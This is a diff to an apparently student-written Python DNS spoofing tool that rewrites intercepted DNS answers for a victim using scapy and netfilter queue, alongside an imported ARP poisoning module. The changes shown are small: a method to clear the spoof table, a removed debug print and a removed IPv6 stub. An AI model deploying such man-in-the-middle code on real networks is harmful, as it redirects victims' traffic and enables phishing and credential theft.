@@ -4,6 +4,8 @@ import threading
 import os
 import re
 
+from arp_poisoning import test
+
 class DnsPoisoner():
 
     def __init__(self, ip_victim, queue_num):
@@ -24,6 +26,10 @@ class DnsPoisoner():
         url_pattern = re.compile(url.replace(".", "[.]").replace("*", ".*"))
         self.urls_to_spoof[url_pattern] = ip
 
+    def clean_urls(self):
+
+        self.urls_to_spoof = {}
+
     def get_ip(self, url):
         
         for url_pattern in self.urls_to_spoof.keys():
@@ -37,7 +43,6 @@ class DnsPoisoner():
         packet_scapy = IP(packet_nfqueue.get_payload())    #converts the raw packet to a scapy compatible string
 
         if packet_scapy.haslayer(DNSRR):
-            print "Packet has DNSRR"
             packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet for spoof
             packet_nfqueue.set_payload(bytes(packet_scapy))    #converts scapy compatible string back to raw packet
 
@@ -58,17 +63,6 @@ class DnsPoisoner():
                 del(packet[IP].chksum)
                 del(packet[UDP].len)
                 del(packet[UDP].chksum)
-            
-            # ipv6
-            elif packet[DNSQR].qtype == 28:
-                pass # TODO wat te doen met ipv6?
-                # packet[DNSRR].rdata = ip_to_spoof
-                # packet[DNS].ancount = 1
-                # del(packet[IPv6].plen)
-                # del(packet[IPv6].fl)
-                # del(packet[IPv6].chksum)
-                # del(packet[UDP].len)
-                # del(packet[UDP].chksum)
 
         return packet
 
